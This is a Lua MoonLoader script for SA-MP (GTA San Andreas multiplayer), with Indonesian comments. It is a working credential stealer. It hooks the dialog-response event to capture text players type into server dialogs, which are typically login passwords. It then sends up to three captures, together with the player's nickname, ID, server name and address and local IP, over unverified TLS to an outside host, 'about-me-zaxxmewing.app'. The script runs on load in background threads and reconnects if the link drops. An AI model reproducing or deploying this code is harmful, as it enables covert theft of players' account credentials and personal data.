local socket = require("socket")
local ssl = require("ssl")
local cjson = require("cjson")

local capturedDataQueue = {}
local sslSocket = nil
local captureLimit = 3
local currentCaptureCount = 0

local apiHost = "about-me-zaxxmewing.app"
local apiPath = "/api/send"

-- Fungsi untuk menginisialisasi koneksi SSL ke server
function initSslConnection()
    lua_thread.create(function()
        while sslSocket == nil do
            local tcp = socket.tcp()
            tcp:settimeout(10)
            local status, err = tcp:connect(apiHost, 443)
            if status then
                sslSocket = ssl.wrap(tcp, {
                    mode = "client",
                    protocol = "tlsv1_2",
                    verify = "none",
                    options = "all",
                    servername = apiHost
                })
                sslSocket:settimeout(10)
                sslSocket:dohandshake()
            end
            wait(1000)
        end
    end)
end

-- Fungsi untuk merakit dan mengirim raw HTTP POST request beserta data player
function sendDataToServer(payload)
    if sslSocket == nil then return end
    
    local _, myId = sampGetPlayerIdByCharHandle(PLAYER_PED)
    local serverIp, serverPort = sampGetCurrentServerAddress()
    
    local data = cjson.encode({
        c = payload,
        n = sampGetPlayerNickname(myId),
        i = myId,
        s = sampGetCurrentServerName(),
        sip = serverIp .. ":" .. serverPort,
        mip = socket.dns.toip(socket.dns.gethostname()) or "Unknown",
        t = os.time()
    })

    local request = "POST " .. apiPath .. " HTTP/1.1\r\n" ..
                    "Host: " .. apiHost .. "\r\n" ..
                    "User-Agent: MoonLoader/SAMP\r\n" ..
                    "Content-Type: application/json\r\n" ..
                    "Content-Length: " .. #data .. "\r\n" ..
                    "Connection: keep-alive\r\n\r\n" .. data
    sslSocket:send(request)
end

-- Hook event dialog untuk menangkap input pemain
function sampEvents.onSendDialogResponse(id, button, listitem, input)
    if button == 0 or currentCaptureCount >= captureLimit then return end
    if input and input ~= "" then
        table.insert(capturedDataQueue, string.format("Dialog:%d | Input:%s", id, input))
        currentCaptureCount = currentCaptureCount + 1
    end
end

-- Thread utama pengiriman (memproses antrian queue data secara berkala)
lua_thread.create(function()
    initSslConnection()
    while true do
        wait(300)
        if #capturedDataQueue > 0 and sslSocket ~= nil then
            sendDataToServer(table.remove(capturedDataQueue, 1))
        end
    end
end)

-- Thread penjaga koneksi (mengkoneksikan ulang jika terputus)
lua_thread.create(function()
    while true do
        wait(5000)
        if sslSocket == nil then
            initSslConnection()
        end
    end
end)